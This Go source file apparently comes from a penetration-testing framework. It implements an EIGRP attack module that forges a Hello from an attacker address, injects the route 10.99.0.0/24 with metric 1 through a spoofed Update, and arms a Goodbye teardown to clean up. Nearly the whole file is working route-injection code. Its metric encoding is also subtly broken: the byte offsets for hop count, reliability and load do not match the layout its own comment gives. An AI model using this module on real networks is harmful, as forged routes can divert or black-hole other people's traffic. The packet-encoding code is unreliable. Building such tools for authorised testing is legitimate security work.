// EIGRP models a fixed hello and route-update sequence with an armed goodbye.
// A fixture response carrying the Goodbye flag stops the update. Successful
// transmission does not establish that a router accepted or removed the route.

package routing

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

// EIGRP TLV types (RFC 7868).
const (
	eigrpTLVParameters   uint16 = 0x0001 // General TLV Parameters
	eigrpTLVSequence     uint16 = 0x0002 // Sequence
	eigrpTLVSWVersion    uint16 = 0x0003 // Software Version
	eigrpTLVNextMult     uint16 = 0x0004 // Next Multicast Sequence
	eigrpTLVIPv4Internal uint16 = 0x0102 // IPv4 Internal route
)

// EIGRP flags.
const (
	eigrpFlagInit    uint32 = 0x01 // Init flag (new adjacency)
	eigrpFlagGoodbye uint32 = 0x02 // Goodbye flag (teardown adjacency)
)

// eigrpFinding is the finding detail for the EIGRP behavior.
type eigrpFinding struct {
	Action  string `json:"action"`
	AS      uint16 `json:"as"`
	Route   string `json:"route"`
	Opcode  string `json:"opcode"`
	Restore string `json:"restore"`
	// Refused is true when the target rejected adjacency (auth mismatch).
	Refused bool `json:"refused,omitempty"`
}

// RunEIGRP sends the fixture's hello and route update, with a goodbye
// teardown armed before the first frame.
//
// It requires runner-provided dependencies. A missing response is tolerated
// after 100 ms; a receive or decode failure stops the sequence. Cancellation
// returns ctx.Err(). The fixture's Goodbye flag reports refusal; transmitted
// updates do not confirm adjacency. Concurrent calls require separate dependencies.
func RunEIGRP(ctx context.Context, deps runner.Deps) error {
	if err := ctx.Err(); err != nil {
		return err
	}
	src := srcMAC()
	asNum := uint16(100)

	// Arm the teardown before the first frame.
	// Teardown: goodbye Hello with the Goodbye flag set, which causes
	// the target to remove the adjacency from its table.
	goodbyePkt, err := craftEIGRPHello(src, asNum, eigrpFlagGoodbye)
	if err != nil {
		return fmt.Errorf("eigrp: craft goodbye: %w", err)
	}
	deps.Teardown.Arm("eigrp-goodbye", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, goodbyePkt)
	})

	// Phase 1: Hello (Init flag).
	helloPkt, err := craftEIGRPHello(src, asNum, eigrpFlagInit)
	if err != nil {
		return fmt.Errorf("eigrp: craft hello: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("eigrp: send hello: %w", err)
	}

	// Phase 2: receive the target's response (adjacency formation).
	// Read the target's hello/update from the fixture with a short
	// timeout. If the target rejects (auth mismatch), the fixture
	// feeds a goodbye — detect and report refused adjacency.
	rxCtx, rxCancel := context.WithTimeout(ctx, 100*time.Millisecond)
	refused, rxErr := recvEIGRPAdjacency(rxCtx, deps.AttackLeg)
	rxCancel()
	if err := ctx.Err(); err != nil {
		return err
	}
	if rxErr != nil && !errors.Is(rxErr, context.DeadlineExceeded) {
		return rxErr
	}
	if refused {
		detail := eigrpFinding{
			Action:  "eigrp-adjacency-refused",
			AS:      asNum,
			Opcode:  "hello",
			Restore: "goodbye/flush teardown",
			Refused: true,
		}
		detailBytes, _ := json.Marshal(detail)
		deps.Emitter.Finding("eigrp", detailBytes)
		return nil // clean teardown armed, no partial state
	}

	// Phase 3: route inject (Update with IPv4 Internal TLV).
	injectPkt, err := craftEIGRPRouteInject(src, asNum)
	if err != nil {
		return fmt.Errorf("eigrp: craft inject: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, injectPkt); err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("eigrp: send inject: %w", err)
	}

	// Emit the finding.
	detail := eigrpFinding{
		Action:  "eigrp-route-inject",
		AS:      asNum,
		Route:   "10.99.0.0/24",
		Opcode:  "update",
		Restore: "goodbye/flush teardown",
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("eigrp", detailBytes)

	return nil
}

// recvEIGRPAdjacency reads one frame from the leg and checks whether the
// fixture response carries a Goodbye flag. Receive and decode errors are
// returned to the caller so a broken receiver cannot imply acceptance.
func recvEIGRPAdjacency(ctx context.Context, leg link.Leg) (bool, error) {
	ch := leg.Receive(ctx)
	select {
	case f, ok := <-ch:
		if err := ctx.Err(); err != nil {
			return false, err
		}
		if !ok {
			return false, fmt.Errorf("eigrp: receive: %w", io.EOF)
		}
		if f.Err != nil {
			return false, fmt.Errorf("eigrp: receive: %w", f.Err)
		}
		// Decode EIGRP from the frame. Skip Ethernet + IPv4 to reach
		// the EIGRP payload (protocol 88).
		payload, err := extractIPPayload(f.Data, 88)
		if err != nil {
			return false, fmt.Errorf("eigrp: decode ipv4: %w", err)
		}
		eigrp := &nl.EIGRP{}
		if err := eigrp.DecodeFromBytes(payload, nil); err != nil {
			return false, fmt.Errorf("eigrp: decode: %w", err)
		}
		// Goodbye flag = refused adjacency
		if eigrp.Flags&eigrpFlagGoodbye != 0 {
			return true, nil
		}
		return false, nil
	case <-ctx.Done():
		return false, ctx.Err()
	}
}

// extractIPPayload extracts the IP payload from an Ethernet-encapsulated
// IPv4 frame with the expected protocol. Fragmented or truncated packets
// are rejected because this path does not reassemble them. Ethernet padding
// is excluded from the returned payload.
func extractIPPayload(frame []byte, proto int) ([]byte, error) {
	if len(frame) < 14 {
		return nil, fmt.Errorf("frame too short for Ethernet")
	}
	// Check EtherType is IPv4.
	etherType := binary.BigEndian.Uint16(frame[12:14])
	if etherType != 0x0800 {
		return nil, fmt.Errorf("not IPv4 (EtherType 0x%04x)", etherType)
	}
	// IPv4 header: 14-byte Ethernet + 20-byte minimum IPv4.
	if len(frame) < 14+20 {
		return nil, fmt.Errorf("frame too short for IPv4")
	}
	if frame[14]>>4 != 4 {
		return nil, fmt.Errorf("invalid ipv4 version")
	}
	if int(frame[23]) != proto {
		return nil, fmt.Errorf("unexpected ip protocol %d", frame[23])
	}
	ihl := int(frame[14]&0x0f) * 4
	if ihl < 20 {
		return nil, fmt.Errorf("invalid ipv4 header length %d", ihl)
	}
	if len(frame) < 14+ihl {
		return nil, fmt.Errorf("frame too short for IHL")
	}
	if binary.BigEndian.Uint16(frame[20:22])&0x3fff != 0 {
		return nil, fmt.Errorf("fragmented ipv4 packet")
	}
	// Trim to IP total length to exclude Ethernet padding.
	ipTotalLen := int(binary.BigEndian.Uint16(frame[16:18]))
	if ipTotalLen < ihl {
		return nil, fmt.Errorf("IP total length %d < IHL %d", ipTotalLen, ihl)
	}
	payloadEnd := 14 + ipTotalLen
	if payloadEnd > len(frame) {
		return nil, fmt.Errorf("truncated ipv4 packet")
	}
	return frame[14+ihl : payloadEnd], nil
}

// craftEIGRPHello builds an EIGRP Hello packet: Ethernet → IPv4 (proto 88)
// → EIGRP. Uses the owned [nl.EIGRP] layer for serialization.
func craftEIGRPHello(src net.HardwareAddr, asNum uint16, flags uint32) ([]byte, error) {
	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		Flags:            flags,
		SequenceNumber:   0,
		AckNumber:        0,
		VirtualRouterID:  0,
		AutonomousSystem: asNum,
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       eigrpMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(88),
		SrcIP:    attackerIP,
		DstIP:    eigrpMulticast,
	}
	return craftDefault(eth, ip, eigrp)
}

// craftEIGRPRouteInject builds an EIGRP Update carrying an IPv4 Internal
// route TLV that injects 10.99.0.0/24 with metric 1.
func craftEIGRPRouteInject(src net.HardwareAddr, asNum uint16) ([]byte, error) {
	// IPv4 Internal route TLV: type(2) + length(2) + metric data.
	// The TLV value encodes: prefix length + destination + metric fields.
	routeValue := buildIPv4InternalRouteTLV(24, net.IPv4(10, 99, 0, 0), 1)

	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeUpdate,
		Flags:            0,
		SequenceNumber:   1,
		AckNumber:        0,
		VirtualRouterID:  0,
		AutonomousSystem: asNum,
		TLVs: []nl.EIGRPTLV{
			{Type: eigrpTLVIPv4Internal, Value: routeValue},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       eigrpMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(88),
		SrcIP:    attackerIP,
		DstIP:    eigrpMulticast,
	}
	return craftDefault(eth, ip, eigrp)
}

// buildIPv4InternalRouteTLV builds the value for an EIGRP IPv4 Internal
// route TLV. The format (RFC 7868 §3.3): prefix length (1) + destination
// (variable, rounded up) + metric (variable). This is a minimal valid
// encoding for the in-memory harness.
func buildIPv4InternalRouteTLV(prefixLen int, dest net.IP, metric uint32) []byte {
	var v []byte
	v = append(v, byte(prefixLen)) // prefix length /24
	// Destination: only the network portion (3 bytes for /24)
	networkBytes := (prefixLen + 7) / 8
	v = append(v, dest.To4()[:networkBytes]...)
	// Metric fields (RFC 7868): delay(4) + bandwidth(4) + mtu(3) + hop(1)
	// + reliability(1) + load(1) + reserved(2). Minimal: 16 bytes.
	// The metric parameter scales the delay so a lower metric = better route.
	metricBytes := make([]byte, 16)
	binary.BigEndian.PutUint32(metricBytes[0:4], metric) // delay
	binary.BigEndian.PutUint32(metricBytes[4:8], 1000)   // bandwidth
	metricBytes[9] = 1                                   // hop count
	metricBytes[10] = 255                                // reliability
	metricBytes[11] = 1                                  // load
	v = append(v, metricBytes...)
	return v
}

// Compile-time assertion: the owned EIGRP layer implements SerializableLayer.
var _ gopacket.SerializableLayer = (*nl.EIGRP)(nil)
